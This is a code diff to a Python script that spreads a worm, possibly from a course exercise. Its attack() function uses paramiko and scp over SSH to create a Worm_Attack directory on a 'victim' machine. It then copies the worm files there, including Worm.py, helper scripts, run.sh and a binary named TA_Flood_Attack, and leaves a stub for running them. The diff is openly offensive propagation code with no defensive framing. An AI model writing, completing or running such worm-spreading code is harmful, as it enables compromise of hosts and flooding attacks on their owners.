@@ -29,8 +29,17 @@ def attack():
     print('\nStart attacking...')
 
     # Pass worm to the victim
-    os.system('scp -P {0} Worm.zip {1}@{2}:/home/{1}'.format(victim['port'], victim['name'], victim['ip']))
-    pass
+    command = 'mkdir /home/{0}/Worm_Attack'.format(victim['name'])
+    ssh_command_using_ssh_key(command)
+
+    os.system('scp -P {0} Worm.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+    os.system('scp -P {0} a.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+    os.system('scp -P {0} b.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+    os.system('scp -P {0} TA_Flood_Attack {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+    os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+
+    # Run the worm
+
 
 
 def ssh_command_using_name_pw(command):
@@ -55,7 +64,7 @@ def ssh_command_using_name_pw(command):
 def ssh_command_using_ssh_key(command):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-    client.connect(victim['ip'], port=victim['port'], key_filename='~/.ssh/victim_key')
+    client.connect(victim['ip'], port=victim['port'])
 
     session = client.get_transport().open_session()
 
